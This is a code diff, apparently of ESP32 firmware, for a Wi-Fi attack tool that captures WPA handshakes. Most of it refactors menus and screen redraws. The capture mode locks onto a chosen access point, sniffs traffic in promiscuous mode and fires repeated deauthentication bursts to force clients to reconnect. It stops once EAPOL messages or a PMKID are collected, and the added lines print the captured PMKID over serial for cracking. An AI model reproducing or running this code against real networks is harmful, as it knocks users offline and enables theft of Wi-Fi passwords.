     eapolCount = 0;
     hasPmkid = false;
-    gotMessage1 = false;
-    gotMessage2 = false;
+    gotM1 = false;
+    gotM2 = false;
+    bestSnapLen = 0;
     captureActive = false;
     scanInProgress = false;
     deauthStopped = false;
     candidateReady = false;
+    memset(capturedPmkid, 0, sizeof(capturedPmkid));
 
     needsRedraw = true;
     lastMode = HS_MODE_MENU;
@@ -624,6 +660,8 @@ void handshakeCaptureSetup() {
     lastViewIndex = -1;
     lastEapolCount = 0;
     lastHasPmkid = false;
+    lastGotM1 = false;
+    lastGotM2 = false;
     lastScanCount = 0;
 }
 
@@ -633,21 +671,13 @@ void handshakeCaptureLoop() {
 
     if (currentMode == HS_MODE_SCANNING) {
         esp_wifi_scan_get_ap_num(&currentScanCount);
-        if (currentScanCount != lastScanCount) {
+        if (currentScanCount != lastScanCount || now - lastScanUpdate >= 100) {
             lastScanCount = currentScanCount;
-            needsRedraw = true;
-        }
-        if (now - lastScanUpdate >= scanUpdateInterval) {
             lastScanUpdate = now;
             needsRedraw = true;
         }
-        if (needsRedraw) {
-            drawScanning();
-            needsRedraw = false;
-        }
-        if (now - scanStartTime > SCAN_DURATION) {
-            processScanResults();
-        }
+        if (needsRedraw) { drawScanning(); needsRedraw = false; }
+        if (now - scanStartTime > SCAN_DURATION) processScanResults();
         return;
     }
 
@@ -662,9 +692,7 @@ void handshakeCaptureLoop() {
         return;
     }
 
-    if (captureActive) {
-        processCandidate();
-    }
+    if (captureActive) processCandidate();
 
     bool up    = digitalRead(BTN_UP) == LOW;
     bool down  = digitalRead(BTN_DOWN) == LOW;
@@ -673,34 +701,17 @@ void handshakeCaptureLoop() {
 
     switch (currentMode) {
     case HS_MODE_MENU:
-        if (up || down) {
-            menuSelection ^= 1;
-            needsRedraw = true;
-            delay(180);
-        }
+        if (up || down) { menuSelection ^= 1; needsRedraw = true; delay(180); }
         if (right) {
-            if (menuSelection == 0) {
-                startScan();
-            } else {
-                currentMode = HS_MODE_VIEW_LIST;
-                viewIndex = 0;
-                needsRedraw = true;
-            }
+            if (menuSelection == 0) startScan();
+            else { currentMode = HS_MODE_VIEW_LIST; viewIndex = 0; needsRedraw = true; }
             delay(180);
         }
         break;
 
     case HS_MODE_LIST:
-        if (up && apCount) {
-            apIndex = (apIndex - 1 + apCount) % apCount;
-            needsRedraw = true;
-            delay(180);
-        }
-        if (down && apCount) {
-            apIndex = (apIndex + 1) % apCount;
-            needsRedraw = true;
-            delay(180);
-        }
+        if (up && apCount) { apIndex = (apIndex - 1 + apCount) % apCount; needsRedraw = true; delay(180); }
+        if (down && apCount) { apIndex = (apIndex + 1) % apCount; needsRedraw = true; delay(180); }
         if (right && apCount) {
             strncpy(targetSsid, apList[apIndex].ssid, sizeof(targetSsid) - 1);
             targetSsid[sizeof(targetSsid) - 1] = '\0';
@@ -709,16 +720,17 @@ void handshakeCaptureLoop() {
 
             eapolCount = 0;
             hasPmkid = false;
-            gotMessage1 = false;
-            gotMessage2 = false;
+            gotM1 = false;
+            gotM2 = false;
+            bestSnapLen = 0;
             deauthStopped = false;
             candidateReady = false;
-            memset((void *)capturedPmkid, 0, HS_PMKID_LEN);
+            memset(capturedPmkid, 0, sizeof(capturedPmkid));
+            memset(bestSnap, 0, sizeof(bestSnap));
 
             initWiFi(WIFI_MODE_APSTA);
-            delay(20);
+            delay(30);
             esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
-
             esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
             wifi_promiscuous_filter_t filt = {};
             filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
@@ -732,20 +744,33 @@ void handshakeCaptureLoop() {
             needsRedraw = true;
             delay(180);
         }
-        if (left) {
-            currentMode = HS_MODE_MENU;
-            needsRedraw = true;
-            delay(180);
-        }
+        if (left) { currentMode = HS_MODE_MENU; needsRedraw = true; delay(180); }
         break;
 
     case HS_MODE_CAPTURE: {
         if (left) {
             stopCaptureRadio();
-            bool hadData = (eapolCount > 0);
-            if (hadData) {
+            if (eapolCount > 0) {
                 hsSaveCurrentCapture();
-                savedMsgUntil = now + 1200;
+                // Dump to serial immediately
+                HandshakeEntry tmp;
+                // Re-read last written roughly via current state for serial
+                Serial.println(F("\n=== Capture saved ==="));
+                Serial.printf("SSID: %s\n", targetSsid);
+                Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X  Ch:%u\n",
+                              targetBssid[0], targetBssid[1], targetBssid[2],
+                              targetBssid[3], targetBssid[4], targetBssid[5],
+                              targetChannel);
+                Serial.printf("EAPOL: %u  M1:%s M2:%s PMKID:%s\n",
+                              (unsigned)eapolCount,
+                              gotM1 ? "Y" : "N", gotM2 ? "Y" : "N",
+                              hasPmkid ? "Y" : "N");
+                if (hasPmkid) {
+                    Serial.print("PMKID: ");
+                    for (int i = 0; i < 16; i++) Serial.printf("%02x", capturedPmkid[i]);
+                    Serial.println();
+                }
+                savedMsgUntil = now + 1500;
                 currentMode = HS_MODE_SAVED_MSG;
             } else {
                 currentMode = HS_MODE_LIST;
@@ -759,35 +784,32 @@ void handshakeCaptureLoop() {
             stopCaptureRadio();
             if (eapolCount > 0) {
                 hsSaveCurrentCapture();
-                savedMsgUntil = now + 1200;
+                savedMsgUntil = now + 1500;
                 currentMode = HS_MODE_SAVED_MSG;
-            } else {
-                currentMode = HS_MODE_LIST;
-            }
+            } else currentMode = HS_MODE_LIST;
             needsRedraw = true;
             break;
         }
 
-        bool success = hasPmkid || (gotMessage1 && gotMessage2);
+        bool success = hasPmkid || (gotM1 && gotM2);
         if (success && !deauthStopped) {
             deauthStopped = true;
             needsRedraw = true;
         }
 
-        unsigned long interval = deauthStopped ? DEAUTH_BURST_INTERVAL_SLOW
-                                               : DEAUTH_BURST_INTERVAL_ACTIVE;
+        unsigned long interval = deauthStopped ? DEAUTH_SLOW : DEAUTH_FAST;
         if (now - lastDeauthTime >= interval) {
             lastDeauthTime = now;
-            if (!deauthStopped) {
-                sendDeauthBurst();
-            } else if ((now / 3000) % 2 == 0) {
-                sendDeauthBurst();
-            }
+            if (!deauthStopped) sendDeauthBurst();
+            else if (((now / 2000) & 1) == 0) sendDeauthBurst();
         }
 
-        if (eapolCount != lastEapolCount || hasPmkid != lastHasPmkid) {
+        if (eapolCount != lastEapolCount || hasPmkid != lastHasPmkid ||
+            gotM1 != lastGotM1 || gotM2 != lastGotM2) {
             lastEapolCount = eapolCount;
             lastHasPmkid = hasPmkid;
+            lastGotM1 = gotM1;
+            lastGotM2 = gotM2;
             needsRedraw = true;
         }
         break;
@@ -795,18 +817,14 @@ void handshakeCaptureLoop() {
 
     case HS_MODE_VIEW_LIST: {
         uint8_t count = hsLoadCount();
-        if (up && count) {
-            viewIndex = (viewIndex - 1 + count) % count;
-            needsRedraw = true;
-            delay(180);
-        }
-        if (down && count) {
-            viewIndex = (viewIndex + 1) % count;
-            needsRedraw = true;
-            delay(180);
-        }
+        if (up && count) { viewIndex = (viewIndex - 1 + count) % count; needsRedraw = true; delay(180); }
+        if (down && count) { viewIndex = (viewIndex + 1) % count; needsRedraw = true; delay(180); }
         if (right && count) {
             currentMode = HS_MODE_VIEW_DETAIL;
+            // Dump to serial when opening detail
+            HandshakeEntry e;
+            hsReadEntry(viewIndex, e);
+            serialDumpEntry(e, viewIndex);
             needsRedraw = true;
             delay(180);
         }
@@ -816,47 +834,26 @@ void handshakeCaptureLoop() {
             needsRedraw = true;
             delay(400);
         }
-        if (left) {
-            currentMode = HS_MODE_MENU;
-            needsRedraw = true;
-            delay(180);
-        }
+        if (left) { currentMode = HS_MODE_MENU; needsRedraw = true; delay(180); }
         break;
     }
 
     case HS_MODE_VIEW_DETAIL:
-        if (left) {
-            currentMode = HS_MODE_VIEW_LIST;
-            needsRedraw = true;
-            delay(180);
-        }
+        if (left) { currentMode = HS_MODE_VIEW_LIST; needsRedraw = true; delay(180); }
         break;
 
     default:
         break;
     }
 
-    if (currentMode != lastMode) {
-        lastMode = currentMode;
-        needsRedraw = true;
-    }
-    if (menuSelection != lastMenuSelection) {
-        lastMenuSelection = menuSelection;
-        needsRedraw = true;
-    }
-    if (apIndex != lastApIndex) {
-        lastApIndex = apIndex;
-        needsRedraw = true;
-    }
-    if (viewIndex != lastViewIndex) {
-        lastViewIndex = viewIndex;
-        needsRedraw = true;
-    }
+    if (currentMode != lastMode) { lastMode = currentMode; needsRedraw = true; }
+    if (menuSelection != lastMenuSelection) { lastMenuSelection = menuSelection; needsRedraw = true; }
+    if (apIndex != lastApIndex) { lastApIndex = apIndex; needsRedraw = true; }
+    if (viewIndex != lastViewIndex) { lastViewIndex = viewIndex; needsRedraw = true; }
 
     if (needsRedraw) {
         switch (currentMode) {
         case HS_MODE_MENU:        drawMenu(); break;
-        case HS_MODE_SCANNING:    break;
         case HS_MODE_LIST:        drawList(); break;
         case HS_MODE_CAPTURE:     drawCapture(); break;
         case HS_MODE_VIEW_LIST:   drawViewList(); break;
